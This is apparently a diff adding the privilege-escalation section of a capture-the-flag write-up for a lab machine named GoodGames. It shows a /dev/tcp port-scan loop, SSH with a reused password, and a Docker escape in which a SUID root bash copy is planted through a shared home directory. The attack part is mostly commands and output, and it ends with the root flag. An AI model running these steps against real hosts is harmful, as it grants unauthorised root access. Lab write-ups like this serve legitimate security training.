@@ -127,4 +127,51 @@ root@3a453ab39d3d:/home/augustus# cat user.txt
 cat user.txt
 5f13d28eb7e3d67bc5f3e9968004aaf1
 
-[+]PRIVILAGE ESCALATION[+]
+[+]PRIVILAGE ESCALATION[+] DOCKER
+We need escape the docker container.
+We find a Augustus user in system and PORT 22 is open ...
+PORTSCANN 
+root@3a453ab39d3d:/backend# for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+cp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+port 22 is open
+port 80 is open
+
+script /dev/null bash
+
+root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
+Password : superadministrator
+
+augustus@GoodGames:~$ whoami
+augustus
+
+augustus@GoodGames:~$ hostname -I
+hostname -I
+10.10.11.130 172.19.0.1 172.17.0.1
+
+Copy bash to the user directory as augustus which we are already authenticated as on the host
+machine, then exit out of the SSH session. Change the ownership of the bash executable to
+root:root (owned by root and in root group) from within the Docker container and apply the
+SUID permissions to it.
+
+# As augustus on host machine
+augustus@GoodGames:~$ cp /bin/bash .
+exit
+
+# As root in the docker container
+root@3a453ab39d3d:/home/augustus# chown root:root bash
+root@3a453ab39d3d:/home/augustus# chmod 4755 bash
+exit
+
+SSH back into augustus user on the host machine and check the permissions of the bash
+executable.
+
+ssh augustus@172.19.0.1
+augustus@GoodGames:~$ ls -l
+-rwsr-xr-x 1 root root     1234376 May 24 09:50 bash
+
+augustus@GoodGames:~$ ./bash -p
+bash-5.1# whoami
+root
+
+bash-5.1# cat /root/root.txt
+d2aed550865b663828abf36e330a90b8
